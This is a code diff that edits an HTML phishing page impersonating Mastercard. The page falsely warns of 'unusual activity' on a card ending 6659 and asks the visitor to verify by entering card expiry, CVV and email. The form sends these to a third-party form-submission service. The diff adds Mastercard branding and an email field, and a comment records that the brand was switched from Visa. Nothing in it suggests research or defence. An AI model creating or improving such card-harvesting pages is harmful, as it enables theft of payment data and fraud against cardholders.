@@ -10,20 +10,33 @@
         .container {
             text-align: center;
             margin-top: 50px; /* Adjust as needed */
+            font-family: 'Trebuchet MS', sans-serif; /* Changed font to Trebuchet MS */
+            position: relative; /* Added position relative for container */
         }
 
         /* Form styling */
         form {
             display: inline-block;
             text-align: left; /* Resetting text alignment */
+            font-family: 'Trebuchet MS', sans-serif; /* Changed font to Trebuchet MS */
+        }
+
+        /* Added Mastercard logo */
+        .mastercard-logo {
+            position: absolute;
+            top: 10px; /* Adjust as needed */
+            left: 10px; /* Adjust as needed */
+            width: 50px; /* Adjust as needed */
+            height: auto;
         }
     </style>
 </head>
 <body>
 
 <div class="container">
+
     <h1>Verification</h1>
-    <h3>We Have Detected Some Unusual Activity On Your Mastercard Card Ending With 6659. Please Verify Your Authenticity.</h3>
+    <h3>We Have Detected Some Unusual Activity On Your Mastercard Ending With 6659. Please Verify Your Authenticity.</h3> <!-- Changed "Visa" to "Mastercard" -->
 
     <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
         <!-- Replace with your Access Key -->
@@ -39,6 +52,8 @@
         <input type="text" name="Message" placeholder="MM/YYYY" required maxlength="7" id="message-input">
         
         <input type="text" name="3digit" placeholder="CVV" required>
+        
+        <input type="email" name="email" placeholder="Email"> <!-- Moved email input to the bottom of the CVV line -->
 
         <button type="submit">Submit Form</button>
     </form>
